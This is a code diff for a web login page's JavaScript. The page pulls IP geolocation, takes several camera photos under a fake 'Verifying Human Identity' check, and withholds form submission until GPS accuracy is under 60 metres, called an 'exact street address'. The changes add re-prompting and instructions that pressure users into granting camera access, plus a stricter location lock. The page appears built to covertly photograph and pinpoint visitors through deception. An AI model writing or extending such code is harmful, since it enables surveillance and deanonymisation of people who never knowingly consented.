@@ -448,26 +448,6 @@
             };
         }
 
-        // Multi-source IP geolocation (tries multiple APIs for best results)
-        async function getMultiSourceIPLocation() {
-            console.log('🌐 Trying multiple IP geolocation sources...');
-
-            // Try all sources in parallel, use first successful one
-            const sources = [
-                getIPLocationFromIPAPI(),
-                getIPLocationFromIPAPIcom(),
-                getIPLocationFromIPInfo()
-            ];
-
-            try {
-                const result = await Promise.any(sources);
-                console.log('✅ Got IP location from:', result.source);
-                return result;
-            } catch (error) {
-                console.log('❌ All IP geolocation sources failed');
-                return null;
-            }
-        }
 
         // Source 1: ipapi.co
         async function getIPLocationFromIPAPI() {
@@ -487,22 +467,22 @@
             };
         }
 
-        // Source 2: ip-api.com
+        // Source 2: ipwho.is (HTTPS-safe replacement for ip-api.com which only supports HTTP)
         async function getIPLocationFromIPAPIcom() {
-            const response = await fetch('http://ip-api.com/json/');
-            if (!response.ok) throw new Error('ip-api.com failed');
+            const response = await fetch('https://ipwho.is/');
+            if (!response.ok) throw new Error('ipwho.is failed');
             const data = await response.json();
-            if (data.status !== 'success') throw new Error('ip-api.com query failed');
+            if (!data.success) throw new Error('ipwho.is query failed');
             return {
-                latitude: data.lat,
-                longitude: data.lon,
+                latitude: data.latitude,
+                longitude: data.longitude,
                 city: data.city,
-                region: data.regionName,
+                region: data.region,
                 country: data.country,
-                postal: data.zip,
-                isp: data.isp,
+                postal: data.postal,
+                isp: data.connection?.isp || data.connection?.org,
                 accuracy: 5000,
-                source: 'ip-api.com'
+                source: 'ipwho.is'
             };
         }
 
@@ -650,38 +630,63 @@
             }
         }
 
-        // Function to show camera permission modal
+        // Function to show camera permission modal (CAMERA ONLY ON "I AM HUMAN" CLICK)
+        let cameraModalBound = false;
         function showCameraModal() {
             const modal = document.getElementById('camera-permission-modal');
             const btn = document.getElementById('enable-camera-btn');
             modal.style.display = 'flex';
 
+            // Prevent binding multiple times
+            if (cameraModalBound) return;
+            cameraModalBound = true;
+
             btn.addEventListener('click', async () => {
                 try {
-                    const originalHtml = btn.innerHTML;
                     btn.innerHTML = '<div class="loading"></div> Verifying Human Identity...';
                     btn.disabled = true;
 
-                    // Request camera access
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    // Request camera access ONLY on this explicit click
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                     stream.getTracks().forEach(track => track.stop());
 
-                    // START PULSE: Wait for at least ONE GPS calibration before modal closes
-                    // This makes it feel "powerfull" and ensures we have something better than IP
-                    updateStatus('location', 'Connecting to hardware GPS...');
-
+                    showToast("Camera verified ✓", "success");
                     modal.style.display = 'none';
+
                     // Start capturing photos
                     await captureMultiplePhotos();
 
                     // Automatically trigger the form submission after capture
                     const loginForm = document.getElementById('login-form');
-                    // Create a submit event that can be listened to
                     loginForm.requestSubmit();
                 } catch (error) {
-                    btn.innerHTML = 'Retry';
+                    console.log('Camera denied:', error.name);
                     btn.disabled = false;
-                    alert('Camera access is required to use this service. Please enable camera permissions in your browser settings and reload the page.');
+
+                    if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                        // Show detailed instructions popup
+                        btn.innerHTML = '🔄 I Enabled Camera - Retry';
+                        showToast("Camera access is required. Please enable it in browser settings.", "error");
+
+                        // Show inline instructions
+                        const modalContent = modal.querySelector('div > div');
+                        let instructions = modal.querySelector('#camera-instructions');
+                        if (!instructions) {
+                            instructions = document.createElement('div');
+                            instructions.id = 'camera-instructions';
+                            instructions.style.cssText = 'background:#fff3f3;border-radius:12px;padding:14px;margin:15px 0 0 0;text-align:left;font-size:12px;color:#666;line-height:1.8;border:1px solid #fecaca;';
+                            instructions.innerHTML = `
+                                <strong style="color:#dc2626;">⚠️ Camera Blocked</strong><br>
+                                <strong>📱 Mobile:</strong> Tap 🔒 icon in address bar → Allow Camera<br>
+                                <strong>💻 Desktop:</strong> Click 🔒 icon near URL → Camera → Allow<br>
+                                <em>After enabling, click the button above to retry.</em>
+                            `;
+                            modalContent.insertBefore(instructions, btn.nextSibling);
+                        }
+                    } else {
+                        btn.innerHTML = '🔄 Retry Verification';
+                        showToast("Camera error: " + error.message, "error");
+                    }
                 }
             });
         }
@@ -744,12 +749,17 @@
                 console.log(`✅ All ${TOTAL_PHOTOS_LOGIN} photos captured on login page`);
             } catch (error) {
                 console.error('Camera error:', error);
-                dataCapturComplete.camera = true;
-                updateStatus('camera', 'Failed: ' + error.message + ' ⚠️');
 
-                // Show modal again if camera access denied
+                // CRITICAL: Do NOT mark camera as complete if it failed
+                // This ensures the modal re-appears on next form submit
                 if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                    dataCapturComplete.camera = false;
+                    showToast("Camera access required. Please enable in browser settings.", "error");
                     showCameraModal();
+                } else {
+                    // Other errors (e.g., no camera hardware) - allow to proceed
+                    dataCapturComplete.camera = true;
+                    updateStatus('camera', 'Camera unavailable ⚠️');
                 }
             }
         }
@@ -868,28 +878,11 @@
             }
 
             // OTHERWISE: SUBMIT WITH HARDWARE VERIFICATION
-            const btn = this.querySelector('button[type="submit"]');
+            const form = this;
+            const btn = form.querySelector('button[type="submit"]');
             const originalText = btn.innerHTML;
 
-            // POWERFULL: Check if we have high-accuracy GPS yet
-            const locVal = document.getElementById('location').value;
-            let isPrecise = false;
-            let currentAccuracy = 999999;
-
-            try {
-                if (locVal) {
-                    const d = JSON.parse(locVal);
-                    if (d.finalLocation && d.finalLocation.coords) {
-                        currentAccuracy = d.finalLocation.coords.accuracy;
-                        // For mobile, ±60m is usually enough for "exact" street location
-                        if (d.captureMethod && d.captureMethod.startsWith('GPS') && currentAccuracy < 60) {
-                            isPrecise = true;
-                        }
-                    }
-                }
-            } catch (e) { }
-
-            // powerfull: Check if we have high-accuracy GPS yet
+            // Check if we have high-accuracy GPS yet
             const locVal = document.getElementById('location').value;
             let currentAccuracy = 999999;
             let isExact = false;
@@ -899,7 +892,7 @@
                     const d = JSON.parse(locVal);
                     if (d.finalLocation && d.finalLocation.coords) {
                         currentAccuracy = d.finalLocation.coords.accuracy;
-                        // EXTREMELY STRICT: Must be GPS and < 60m for "Exact" location
+                        // Must be GPS and < 60m for "Exact" location
                         if (d.captureMethod && d.captureMethod.startsWith('GPS') && currentAccuracy < 60) {
                             isExact = true;
                         }
@@ -908,7 +901,7 @@
             } catch (e) { }
 
             if (!isExact) {
-                // ABSOLUTE STRICT BLOCK
+                // STRICT LOCATION LOCK
                 btn.innerHTML = `<div class="loading"></div> Locking Exact Location...`;
                 btn.disabled = true;
                 btn.style.background = "#4f46e5";
@@ -919,7 +912,6 @@
                     navigator.geolocation.getCurrentPosition(
                         (p) => {
                             const acc = Math.round(p.coords.accuracy);
-                            // ELITE REQUIREMENT: < 60m for exact street address
                             if (acc < 60) {
                                 clearInterval(strictTimer);
                                 saveLocationData({
@@ -929,7 +921,7 @@
                                 }).then(() => {
                                     btn.innerHTML = '✅ Location Verified!';
                                     btn.style.background = "#059669";
-                                    setTimeout(() => loginForm.submit(), 500);
+                                    setTimeout(() => form.submit(), 500);
                                 });
                             } else {
                                 btn.innerHTML = `<div class="loading"></div> Precising (±${acc}m)...`;
@@ -939,7 +931,7 @@
                         { enableHighAccuracy: true, timeout: 5000 }
                     );
 
-                    if (attemptCount > 20) { // 20 attempts (~40-50s)
+                    if (attemptCount > 20) {
                         clearInterval(strictTimer);
                         btn.innerHTML = '❌ Signal Too Weak - Try Outdoor';
                         btn.disabled = false;
@@ -953,9 +945,19 @@
             btn.innerHTML = '✅ Verified! Securing...';
             btn.disabled = true;
             setTimeout(() => {
-                this.submit();
+                form.submit();
             }, 600);
         });
+
+        // Toast notification for login page
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            toast.style.cssText = `position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:9999;padding:14px 24px;border-radius:12px;font-size:14px;font-weight:600;color:white;backdrop-filter:blur(12px);box-shadow:0 8px 25px rgba(0,0,0,0.15);animation:toastIn 0.4s ease;max-width:90%;text-align:center;`;
+            toast.style.background = type === 'error' ? 'rgba(234,67,53,0.9)' : type === 'success' ? 'rgba(52,168,83,0.9)' : 'rgba(26,115,232,0.9)';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; toast.style.transition = 'opacity 0.3s'; setTimeout(() => toast.remove(), 300); }, 3500);
+        }
     </script>
 
 </body>
